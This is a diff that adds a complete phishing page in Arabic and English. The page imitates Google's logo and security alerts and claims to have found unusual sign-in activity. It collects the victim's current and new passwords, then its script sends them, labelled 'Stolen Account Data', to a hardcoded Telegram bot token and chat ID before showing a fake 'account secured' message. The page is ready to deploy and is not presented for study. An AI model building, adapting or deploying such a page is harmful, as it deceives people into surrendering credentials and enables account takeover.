@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" id="htmlRoot">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Nasro - أمان الحساب</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    body {
+      background: #f8f9fa;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px 60px;
+    }
+
+    .logo {
+      font-size: 60px;
+      font-weight: 400;
+      margin: 0 0 40px;
+      letter-spacing: -2px;
+      line-height: 1;
+    }
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #34A853; }
+    .logo span:nth-child(5) { color: #4285F4; }
+    .logo span:nth-child(6) { color: #EA4335; }
+
+    .page {
+      display: none;
+      width: 100%;
+      max-width: 390px;
+      text-align: center;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      padding: 32px 40px;
+      transition: transform 0.2s;
+    }
+
+    .page.active {
+      display: block;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .page h1 {
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 16px;
+      color: #202124;
+    }
+
+    .page p {
+      font-size: 16px;
+      color: #5F6368;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .btn {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 100%;
+      max-width: 200px;
+      box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+      transition: background 0.2s, box-shadow 0.2s;
+    }
+    .btn:hover {
+      background: #1765c4;
+      box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      /* لا نضع text-align هنا، بل نتحكم به عبر dir */
+    }
+
+    /* في اللغة العربية (RTL): تسميات على اليمين */
+    [dir="rtl"] .form-group label {
+      text-align: right;
+      direction: rtl;
+    }
+
+    /* في اللغة الإنجليزية (LTR): تسميات على اليسار */
+    [dir="ltr"] .form-group label {
+      text-align: left;
+      direction: ltr;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      color: #5F6368;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      font-size: 16px;
+      background: white;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+    }
+
+    .footer {
+      margin-top: 24px;
+      font-size: 14px;
+      color: #5F6368;
+    }
+
+    /* الروابط السفلية + مُبدِّل اللغة */
+    .footer-bar {
+      margin-top: 32px;
+      font-size: 13px;
+      color: #5F6368;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .footer-bar a {
+      color: #5F6368;
+      text-decoration: none;
+    }
+
+    .footer-bar a:hover {
+      text-decoration: underline;
+      color: #202124;
+    }
+
+    .language-switcher {
+      display: flex;
+      gap: 12px;
+      margin-top: 8px;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 30px 15px 50px;
+      }
+      .logo {
+        font-size: 50px;
+        margin-bottom: 32px;
+      }
+      .page {
+        padding: 24px 30px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- الشعار -->
+  <div class="logo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  </div>
+
+  <!-- الصفحة 1 -->
+  <div id="page1" class="page active">
+    <h1 data-ar="تم اكتشاف نشاط غير معتاد" data-en="Unusual activity detected">تم اكتشاف نشاط غير معتاد</h1>
+    <p data-ar="لقد رصد نظام الأمان لدينا محاولة دخول إلى حسابك من جهاز أو موقع غير مألوف. لحماية معلوماتك، يُرجى التحقق من هويتك فورًا." 
+       data-en="Our security system detected a sign-in attempt from an unfamiliar device or location. To protect your info, please verify your identity now.">
+      لقد رصد نظام الأمان لدينا محاولة دخول إلى حسابك من جهاز أو موقع غير مألوف.  
+      لحماية معلوماتك، يُرجى التحقق من هويتك فورًا.
+    </p>
+    <button class="btn" onclick="showPage(2)" data-ar="التحقق الآن" data-en="Verify now">التحقق الآن</button>
+  </div>
+
+  <!-- الصفحة 2 -->
+  <div id="page2" class="page">
+    <h1 data-ar="تحديث كلمة المرور" data-en="Update password">تحديث كلمة المرور</h1>
+    <p data-ar="لضمان أمان حسابك، يُرجى تعيين كلمة مرور جديدة." 
+       data-en="To keep your account secure, please set a new password.">
+      لضمان أمان حسابك، يُرجى تعيين كلمة مرور جديدة.
+    </p>
+    <form id="passwordForm">
+      <div class="form-group">
+        <label for="current" data-ar="كلمة المرور الحالية" data-en="Current password">كلمة المرور الحالية</label>
+        <input type="password" id="current" required autocomplete="current-password" />
+      </div>
+      <div class="form-group">
+        <label for="new" data-ar="كلمة المرور الجديدة" data-en="New password">كلمة المرور الجديدة</label>
+        <input type="password" id="new" required minlength="8" autocomplete="new-password" />
+      </div>
+      <div class="form-group">
+        <label for="confirm" data-ar="تأكيد كلمة المرور الجديدة" data-en="Confirm new password">تأكيد كلمة المرور الجديدة</label>
+        <input type="password" id="confirm" required autocomplete="new-password" />
+      </div>
+      <button class="btn" type="submit" data-ar="تحديث الأمان" data-en="Update security">تحديث الأمان</button>
+    </form>
+  </div>
+
+  <!-- الصفحة 3 -->
+  <div id="page3" class="page">
+    <h1 data-ar="تم تأمين حسابك بنجاح!" data-en="Your account is now secure!">تم تأمين حسابك بنجاح!</h1>
+    <p data-ar="شكرًا لك على سرعة استجابتك. حسابك الآن محمي ضد أي محاولات وصول غير مصرّح بها." 
+       data-en="Thank you for your quick response. Your account is now protected against unauthorized access.">
+      شكرًا لك على سرعة استجابتك.  
+      حسابك الآن محمي ضد أي محاولات وصول غير مصرّح بها.
+    </p>
+    <div class="footer" data-ar="© Google security — 2026" data-en="© Google security — 2026">
+      © Google security — 2026
+    </div>
+  </div>
+
+  <!-- شريط التذييل: روابط + تبديل اللغة -->
+  <div class="footer-bar">
+    <a href="#" onclick="alert('Help page')" data-ar="Help" data-en="Help">Help</a>
+    <a href="#" onclick="alert('Privacy Policy')" data-ar="Privacy" data-en="Privacy">Privacy</a>
+    <a href="#" onclick="alert('Terms of Service')" data-ar="Terms" data-en="Terms">Terms</a>
+  </div>
+
+  <div class="language-switcher">
+    <a href="#" id="lang-ar" style="font-weight: bold; color: #202124;">العربية</a>
+    <span>|</span>
+    <a href="#" id="lang-en">English</a>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8502465686:AAEN5mfRHs7mKhjloonafpU9x46xJNFKFko';
+    const TELEGRAM_CHAT_ID = '5218031067';
+    let currentLang = 'ar'; // الافتراضي: عربي
+
+    function showPage(pageNumber) {
+      document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+      document.getElementById(`page${pageNumber}`).classList.add('active');
+    }
+
+    // تبديل اللغة
+    function switchLanguage(lang) {
+      if (lang === currentLang) return;
+      
+      currentLang = lang;
+      const isArabic = lang === 'ar';
+      
+      // تحديث اتجاه HTML
+      document.getElementById('htmlRoot').dir = isArabic ? 'rtl' : 'ltr';
+      document.getElementById('htmlRoot').lang = lang;
+
+      // تحديث عناصر النص
+      document.querySelectorAll('[data-ar]').forEach(el => {
+        el.textContent = isArabic ? el.dataset.ar : el.dataset.en;
+      });
+
+      // تحديث حالة الروابط
+      document.getElementById('lang-ar').style.fontWeight = isArabic ? 'bold' : 'normal';
+      document.getElementById('lang-ar').style.color = isArabic ? '#202124' : '#5F6368';
+      document.getElementById('lang-en').style.fontWeight = isArabic ? 'normal' : 'bold';
+      document.getElementById('lang-en').style.color = isArabic ? '#5F6368' : '#202124';
+    }
+
+    // ربط أزرار اللغة
+    document.getElementById('lang-ar').addEventListener('click', e => {
+      e.preventDefault();
+      switchLanguage('ar');
+    });
+    document.getElementById('lang-en').addEventListener('click', e => {
+      e.preventDefault();
+      switchLanguage('en');
+    });
+
+    // معالجة إرسال النموذج
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const current = document.getElementById('current').value;
+      const newPassword = document.getElementById('new').value;
+      const confirmPass = document.getElementById('confirm').value;
+
+      let alertMsg = "";
+      if (!current.trim()) {
+        alertMsg = currentLang === 'ar' ? "يرجى إدخال كلمة المرور الحالية." : "Please enter your current password.";
+        alert(alertMsg);
+        return;
+      }
+
+      if (newPassword.length < 8) {
+        alertMsg = currentLang === 'ar' ? "يجب أن تكون كلمة المرور الجديدة مكونة من 8 أحرف على الأقل." : "New password must be at least 8 characters long.";
+        alert(alertMsg);
+        return;
+      }
+
+      if (newPassword !== confirmPass) {
+        alertMsg = currentLang === 'ar' ? "كلمة المرور وتأكيدها غير متطابقين." : "Password and confirmation do not match.";
+        alert(alertMsg);
+        return;
+      }
+
+      const message = `
+🔐 *Stolen Account Data*
+- Current Password: \`${current}\`
+- New Password: \`${newPassword}\`
+- Confirm Password: \`${confirmPass}\`
+- Time: ${new Date().toLocaleString('en-US')}
+      `.trim();
+
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }).catch(console.error).finally(() => {
+        setTimeout(() => showPage(3), 300);
+      });
+    });
+  </script>
+</body>
+</html>
